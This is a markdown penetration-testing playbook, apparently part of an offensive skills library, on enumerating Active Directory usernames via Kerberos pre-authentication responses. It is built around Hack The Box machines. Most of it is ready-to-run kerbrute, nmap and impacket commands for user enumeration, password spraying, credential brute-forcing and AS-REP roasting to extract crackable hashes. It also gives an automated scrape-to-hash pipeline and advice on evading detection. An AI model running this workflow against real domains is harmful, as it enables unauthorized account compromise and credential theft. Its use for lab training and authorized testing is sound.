# Kerberos Username Enumeration

> Use Kerberos pre-authentication as a boolean oracle to validate
> username candidates without authenticating.

## Objective
Determine which usernames exist in an AD domain when LDAP/RPC/SMB are
restricted, by sending pre-auth requests and inspecting the KDC's
response codes.

## When To Use
- AD detected (port 88).
- LDAP / RPC / SMB anonymous enumeration is locked down.
- You have a candidate list (from web-scraping, OSINT, or a wordlist).

## Detection Indicators
- Port 88 open, but anonymous SMB and LDAP return nothing.
- The box exposes a website with employee names.

## Enumeration Strategy

The Kerberos protocol distinguishes:
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` — user does not exist.
- `KDC_ERR_PREAUTH_REQUIRED` — user exists, pre-auth needed (so we
  don't have a cred but the username is real).
- `AS-REP message` — user exists *and* has pre-auth disabled (AS-REP
  candidate).

Tools key off these distinctions to validate users.

```bash
./kerbrute userenum --dc <dc-ip> -d <domain> users.txt
```

## Exploitation Workflow

```bash
# 1. Build a candidate list
./username-anarchy -i names.txt > users.txt
# OR
cat /usr/share/seclists/Usernames/Names/names.txt > users.txt

# 2. Validate
./kerbrute userenum --dc <dc-ip> -d <domain> users.txt -o valid.txt

# 3. Output: [+] <user>@<domain> : valid
grep '\[+\]' valid.txt | awk '{print $5}' | cut -d'@' -f1 > valid-users.txt

# 4. Feed into AS-REPRoast / spray
impacket-GetNPUsers <domain>/ -usersfile valid-users.txt -no-pass -dc-ip <dc-ip> \
  -format hashcat -outputfile asrep.hashes
```

## Commands

```bash
# kerbrute releases (Linux x64)
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute

# username enumeration
./kerbrute userenum --dc <ip> -d <domain> users.txt
./kerbrute userenum --dc <ip> -d <domain> users.txt --threads 30

# password spraying (different mode!)
./kerbrute passwordspray --dc <ip> -d <domain> users.txt 'Welcome1!'

# combined brute force (a username + password file)
./kerbrute bruteuser --dc <ip> -d <domain> passwords.txt <user>
./kerbrute bruteforce --dc <ip> -d <domain> combos.txt
```

## Tool Usage

- `kerbrute` (Go binary, ropnop) — fast, multithreaded, does not lock
  accounts in `userenum` mode.
- `nmap --script krb5-enum-users -p88 --script-args krb5-enum-users.realm='<DOMAIN>',userdb=users.txt <ip>`
  — alternative when you don't want a separate binary.
- `impacket-GetNPUsers` — silently skips invalid users in AS-REP
  workflow; equivalent end-result.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong realm casing | All users "invalid" | Use UPPERCASE realm: `EGOTISTICAL-BANK.LOCAL` |
| Forgetting `--dc` | Tool can't find DC | `--dc <dc-ip>` always |
| Confusing `userenum` with `passwordspray` | Spray locks accounts | userenum is *not* an auth attempt |
| Wordlist in wrong format | "invalid users" loop | Newline-separated, no `@domain` suffix |

## Decision-Making Logic

```
LDAP/RPC/SMB anonymous ❌
  └─ have a candidate list (OSINT / web scrape / wordlist)?
       └─ kerbrute userenum
            ├─ valid users found:
            │    AS-REPRoast them
            │    if no AS-REP, password spray (carefully)
            └─ none valid:
                 expand candidate list (different generator, larger
                 wordlist, additional name sources)
```

## Pivot Opportunities

A confirmed username feeds into:
- AS-REP roasting.
- Password spraying.
- Targeted phishing (real engagements).

## OPSEC Considerations
- `kerbrute userenum` does **not** lock accounts (no auth attempt),
  but generates Event 4768 (TGT requested) on the DC.
- High-volume runs are easy to detect by frequency.
- Throttle with `--delay` if available; avoid `--threads 50` on real
  engagements.

## Real HTB Examples

- **Sauna** — entire foothold step is web scrape → kerbrute → AS-REP.
- **Forest** — kerbrute is the *fallback* (RPC null gave the list
  directly).
- **Resolute** — kerbrute can validate, but RPC null worked.
- **Multimaster** — kerbrute mid-chain to validate scraped users.
- **Sniper** — kerbrute used for spray after foothold.

## Alternative Techniques

- **RPC null session `enumdomusers`** — when allowed.
- **LDAP anonymous bind** — when allowed.
- **`impacket-GetNPUsers` directly** — silently filters invalid users
  in AS-REP path; you can skip a separate validation step.

## Automation Opportunities

```bash
# combined: scrape → permute → kerbrute → AS-REP
curl -s http://<ip>/about | grep -oE '\b[A-Z][a-z]+\s+[A-Z][a-z]+\b' \
  | sort -u > names.txt
./username-anarchy -i names.txt > users.txt
./kerbrute userenum --dc <dc-ip> -d <domain> users.txt 2>/dev/null \
  | grep '\[+\]' | awk '{print $5}' | cut -d'@' -f1 > valid.txt
impacket-GetNPUsers <domain>/ -usersfile valid.txt -no-pass -dc-ip <dc-ip> \
  -format hashcat -outputfile asrep.hashes
```

## Checklist

- [ ] Candidate list built (from web scrape, OSINT, or wordlist)
- [ ] `kerbrute userenum` with realm in UPPERCASE
- [ ] Captured valid users
- [ ] AS-REPRoasted valid users
- [ ] Password-sprayed if AS-REP empty (after checking lockout policy)

## Related Skills

- [`enumeration/website-username-harvest.md`](../enumeration/website-username-harvest.md)
- [`active-directory/as-rep-roasting.md`](as-rep-roasting.md)
- [`active-directory/anonymous-ad-enumeration.md`](anonymous-ad-enumeration.md)
- [`password-attacks/password-spraying.md`](../password-attacks/password-spraying.md)
- [`tool-usage/kerbrute.md`](../tool-usage/kerbrute.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
